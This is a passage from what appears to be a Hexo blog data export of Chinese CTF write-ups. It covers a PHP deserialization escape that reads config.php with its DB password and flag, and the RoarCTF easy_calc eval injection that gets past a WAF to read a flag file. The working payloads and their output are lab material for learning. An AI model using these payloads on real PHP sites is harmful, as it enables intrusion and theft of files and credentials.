class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/images/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/images/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录2","date":"2019-12-26T12:16:12.000Z","_content":"\n## [Roarctf]easy_calc\n\n### 0x01 基础\n\nphp内置读取文件内容函数\n\n```\nfile_get_contents\nreadfile\nfile\n```\n\n目录扫描函数\n\n```\nscandir\n```\n\n<!--more-->\n\n字符转换函数\n\n```\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x02 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x03 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入urldecode后。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，纤细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","source":"_posts/buuoj刷题记录2.md","raw":"---\ntitle: buuoj刷题记录2\ndate: 2019-12-26 20:16:12\ntags:\n - ctf\n - Roarctf\n - web\n - buuoj\n---\n\n## [Roarctf]easy_calc\n\n### 0x01 基础\n\nphp内置读取文件内容函数\n\n```\nfile_get_contents\nreadfile\nfile\n```\n\n目录扫描函数\n\n```\nscandir\n```\n\n<!--more-->\n\n字符转换函数\n\n```\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x02 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x03 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入urldecode后。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，纤细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","slug":"buuoj刷题记录2","published":1,"updated":"2019-12-27T03:48:21.211Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4nmczco0002207e6ffo6620","content":"<h2 id=\"Roarctf-easy-calc\"><a href=\"#Roarctf-easy-calc\" class=\"headerlink\" title=\"[Roarctf]easy_calc\"></a>[Roarctf]easy_calc</h2><h3 id=\"0x01-基础\"><a href=\"#0x01-基础\" class=\"headerlink\" title=\"0x01 基础\"></a>0x01 基础</h3><p>php内置读取文件内容函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents</span><br><span class=\"line\">readfile</span><br><span class=\"line\">file</span><br></pre></td></tr></table></figure>\n\n<p>目录扫描函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scandir</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>字符转换函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hex2bin(&quot;979797&quot;)-&gt;&quot;aaa&quot;</span><br><span class=\"line\">chr(95)-&gt;&quot;a&quot;</span><br></pre></td></tr></table></figure>\n\n<p>输出函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump()</span><br><span class=\"line\">printf()</span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>\n<h3 id=\"0x02-分析\"><a href=\"#0x02-分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析</h3><p>查看源码，发现calc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    $(<span class=\"string\">'#calc'</span>).submit(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">            url:<span class=\"string\">\"calc.php?num=\"</span>+encodeURIComponent($(<span class=\"string\">\"#content\"</span>).val()),</span><br><span class=\"line\">            type:<span class=\"string\">'GET'</span>,</span><br><span class=\"line\">            success:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(data)</span></span>&#123;</span><br><span class=\"line\">                $(\"#result\").html(`&lt;div class=\"alert alert-success\"&gt;</span><br><span class=\"line\">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class=\"line\">            &lt;/div&gt;`);</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            error:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"这啥?算不来!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>进入calc.php,进行代码审计。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'num'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>,<span class=\"string\">'\\$'</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\^'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $str)) &#123;    </span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">\"what are you want to do?\"</span>);<span class=\"comment\">//如果包含黑名单中的字符，程序退出</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$str.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入urldecode后。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，纤细介绍查看<a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">参考连接</a>。</p>\n<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; f1agg [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; root [16] &#x3D;&gt; run [17] &#x3D;&gt; sbin [18] &#x3D;&gt; srv [19] &#x3D;&gt; start.sh [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var ) 1</span><br></pre></td></tr></table></figure>\n\n<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"Roarctf-easy-calc\"><a href=\"#Roarctf-easy-calc\" class=\"headerlink\" title=\"[Roarctf]easy_calc\"></a>[Roarctf]easy_calc</h2><h3 id=\"0x01-基础\"><a href=\"#0x01-基础\" class=\"headerlink\" title=\"0x01 基础\"></a>0x01 基础</h3><p>php内置读取文件内容函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents</span><br><span class=\"line\">readfile</span><br><span class=\"line\">file</span><br></pre></td></tr></table></figure>\n\n<p>目录扫描函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scandir</span><br></pre></td></tr></table></figure>","more":"<p>字符转换函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hex2bin(&quot;979797&quot;)-&gt;&quot;aaa&quot;</span><br><span class=\"line\">chr(95)-&gt;&quot;a&quot;</span><br></pre></td></tr></table></figure>\n\n<p>输出函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump()</span><br><span class=\"line\">printf()</span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>\n<h3 id=\"0x02-分析\"><a href=\"#0x02-分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析</h3><p>查看源码，发现calc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    $(<span class=\"string\">'#calc'</span>).submit(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">            url:<span class=\"string\">\"calc.php?num=\"</span>+encodeURIComponent($(<span class=\"string\">\"#content\"</span>).val()),</span><br><span class=\"line\">            type:<span class=\"string\">'GET'</span>,</span><br><span class=\"line\">            success:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(data)</span></span>&#123;</span><br><span class=\"line\">                $(\"#result\").html(`&lt;div class=\"alert alert-success\"&gt;</span><br><span class=\"line\">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class=\"line\">            &lt;/div&gt;`);</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            error:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"这啥?算不来!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>进入calc.php,进行代码审计。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'num'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>,<span class=\"string\">'\\$'</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\^'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . 